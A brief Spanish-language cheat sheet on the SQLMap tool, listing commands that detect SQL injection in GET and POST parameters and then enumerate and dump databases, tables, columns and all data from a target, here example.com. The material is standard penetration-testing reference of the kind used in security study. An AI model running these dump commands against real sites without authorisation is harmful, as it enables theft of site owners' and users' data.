
# SQLMap
SQLMap es una herramienta de explotación de inyecciones SQL. Ayuda a detectar y explotar inyecciones SQL en aplicaciones web.

[Repositorio oficial](https://github.com/sqlmapproject/sqlmap)
[Wiki con ejemplos](https://github.com/sqlmapproject/sqlmap/wiki/Usage)


# Detectar inyecciones SQL
## Analizar URLs 
Detectar parámetros inyectables en parametros GET
```bash
sqlmap -u "http://example.com/?id=1" 
```

También se podría utilizar la opción `-p` para indicar el parámetro a analizar.
```bash
sqlmap -u "http://example.com/" -p "id" 
```

O como no, para métodos POST
```bash
sqlmap -u "http://example.com/" --data "id=1" 
```


# Explotar inyecciones SQL

Obtener información de la base de datos
```bash
sqlmap -u "http://example.com/?id=1" --dbs
```

Obtener tablas de la base de datos
```bash
sqlmap -u "http://example.com/?id=1" -D "database" --tables
```

Obtener columnas de una tabla
```bash
sqlmap -u "http://example.com/?id=1" -D "database" -T "table" --columns
```

Obtener datos de una tabla
```bash
sqlmap -u "http://example.com/?id=1" -D "database" -T "table" -C "column1,column2" --dump
```

Obtener datos de todas las tablas
```bash
sqlmap -u "http://example.com/?id=1" -D "database" --dump-all
```



